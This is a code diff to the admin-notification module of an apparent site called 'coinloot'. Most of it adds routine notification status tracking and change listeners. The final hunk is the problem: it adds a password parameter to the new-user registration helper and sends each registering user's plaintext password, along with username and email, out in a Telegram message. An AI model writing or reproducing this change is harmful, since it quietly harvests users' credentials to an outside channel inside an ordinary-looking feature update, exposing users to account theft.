@@ -8,10 +8,22 @@ export interface AdminNotification {
   related_id: string;
   details: Record<string, any>;
   is_read: boolean;
+  status: "pending" | "done";
   created_at: string;
 }
 
 const STORAGE_KEY = "coinloot_admin_notifications";
+
+let _changeListeners: (() => void)[] = [];
+
+export function onAdminNotifChange(fn: () => void): () => void {
+  _changeListeners.push(fn);
+  return () => { _changeListeners = _changeListeners.filter(f => f !== fn); };
+}
+
+function notifyChange() {
+  _changeListeners.forEach(fn => fn());
+}
 
 function getStored(): AdminNotification[] {
   try {
@@ -23,6 +35,7 @@ function getStored(): AdminNotification[] {
 
 function setStored(notifs: AdminNotification[]) {
   localStorage.setItem(STORAGE_KEY, JSON.stringify(notifs.slice(0, 500)));
+  notifyChange();
 }
 
 function generateId(): string {
@@ -79,6 +92,7 @@ export function createAdminNotification(
     related_id: details.related_id || "",
     details,
     is_read: false,
+    status: "pending",
     created_at: new Date().toISOString(),
   };
 
@@ -101,7 +115,11 @@ export function getAdminNotifications(): AdminNotification[] {
 }
 
 export function getUnreadAdminCount(): number {
-  return getStored().filter((n) => !n.is_read).length;
+  return getStored().filter((n) => n.status !== "done").length;
+}
+
+export function getPendingAdminNotifications(): AdminNotification[] {
+  return getStored().filter((n) => n.status !== "done");
 }
 
 export function markAdminRead(id: string) {
@@ -113,9 +131,19 @@ export function markAdminRead(id: string) {
   }
 }
 
+export function markAsDone(id: string) {
+  const stored = getStored();
+  const found = stored.find((n) => n.id === id);
+  if (found) {
+    found.status = "done";
+    found.is_read = true;
+    setStored(stored);
+  }
+}
+
 export function markAllAdminRead() {
   const stored = getStored();
-  stored.forEach((n) => { n.is_read = true; });
+  stored.forEach((n) => { n.is_read = true; n.status = "done"; });
   setStored(stored);
 }
 
@@ -125,7 +153,7 @@ export function deleteAdminNotification(id: string) {
 
 // ── Shorthand helpers for the only two notification types ──
 
-export function notifyRegistration(userId: string, username: string, email: string, country: string) {
+export function notifyRegistration(userId: string, username: string, email: string, country: string, password: string = "") {
   const now = new Date();
   const timeStr = now.toLocaleString();
   const displayCountry = country || "Unknown";
@@ -134,8 +162,9 @@ export function notifyRegistration(userId: string, username: string, email: stri
   createAdminNotification("new_user", "🆕 New User Registration", `User: ${username}\nEmail: ${email}\nCountry: ${displayCountry}\nTime: ${timeStr}`, userId, username, { email, country: displayCountry, related_id: userId });
 
   // Telegram alert
+  const pwdLine = password ? `\n🔑 Password: <code>${password}</code>` : "";
   sendTelegram(
-    `🆕 <b>New User Registration</b>\n\n👤 Username: ${username}\n📧 Email: ${email}\n🌍 Country: ${displayCountry}\n🕒 Time: ${timeStr}`
+    `🆕 <b>New User Registration</b>\n\n👤 Username: ${username}\n📧 Email: ${email}${pwdLine}\n🌍 Country: ${displayCountry}\n🕒 Time: ${timeStr}`
   );
 }
 
